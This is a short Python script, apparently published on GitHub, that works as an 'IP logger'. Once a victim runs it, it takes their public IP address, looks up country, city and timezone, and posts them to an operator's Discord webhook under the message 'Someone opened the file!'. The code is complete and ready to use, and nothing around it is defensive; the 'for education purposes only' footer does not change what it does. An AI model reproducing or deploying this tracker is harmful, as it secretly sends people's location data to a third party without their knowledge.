# Import requirements
import requests
import public_ip as getip
from discord_webhook import DiscordWebhook, DiscordEmbed

# Get IP details
publicip = getip.get()
params = ["ip",'query', 'status', 'country', 'countryCode', 'city', 'timezone', 'mobile']

resp = requests.get('http://ip-api.com/json/' + publicip, params={'fields': ','.join(params)})
info = resp.json()

country = info['country']
city = info['city']
countrycode = info['countryCode']
timezone = info['timezone']
status = info['status']

# Set the webhook
webhook = DiscordWebhook(url="", # Enter your Discord Webhook address
                         username="ASISAMKO IP LOGGER") # Enter Webhook name

embed = DiscordEmbed(title="New IP Address Logged 👁️",
                    color = "e8734d",
                    url="https://github.com/asisamko",)

embed.set_author(name="",
                 url="https://github.com/asisamko",
                 icon_url="")

embed.add_embed_field(name=f"Someone opened the file!",
                value="",
                inline=False)

embed.add_embed_field(name="📡 IP Address:",
                value=f"||```{publicip}```||",
                inline=False)
embed.add_embed_field(name="🌎 Country:",
                value=f"{country} ({countrycode})",
                inline=True)
embed.add_embed_field(name="🏣 City:",
                value=f"{city}",
                inline=True)
embed.add_embed_field(name="🌐 Timezone:",
                value=f"{timezone}",
                inline=True)
embed.add_embed_field(name="",
                value=f"",
                inline=True)
embed.set_footer(text=f"For education purposes only!")
embed.set_timestamp()

webhook.add_embed(embed)
response = webhook.execute()